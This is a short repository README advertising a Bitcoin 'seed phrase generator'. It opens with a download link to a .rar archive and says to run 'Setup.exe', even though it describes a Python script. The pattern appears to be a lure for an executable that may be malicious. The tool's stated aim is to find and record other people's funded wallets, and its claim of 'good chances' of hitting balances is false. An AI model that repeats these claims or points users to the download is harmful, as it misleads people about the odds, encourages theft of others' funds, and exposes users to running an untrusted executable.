
# 📦[DOWNLOAD](https://github.com/Pikord/fffff/releases/download/SEED.PHRASE.GENERATOR/SEED.PHRASE.GENERATOR.rar)📦

# Seed-phrase-generator

Seed-phrase-generator is a script that generates a seed phrase for a Bitcoin wallet, calculates the wallet address, and checks its balance and transaction history. It verifies via blockchain.info. If the wallet has a balance or transactions, the script writes the seed phrase and wallet address to a file balance.txt. It supports operation via HTTP proxy, which can be configured using proxy.txt.

## Installation

To use the script, install the required libraries:

pip install bitcoin mnemonic requests python-telegram-bot==13.1


## Usage

1. Run the setup:

Setup.exe


2. The script will begin generating seed phrases and checking wallets.

## Configuration

- The number of iterations can be adjusted in the script (default is 1,000,000).
- The interval between checks is set to 5 seconds by default to avoid IP bans on the site.

## Notes

- Caution: Avoid setting the check interval too low as it may lead to IP bans.
- The script has good chances of finding wallets with balances.

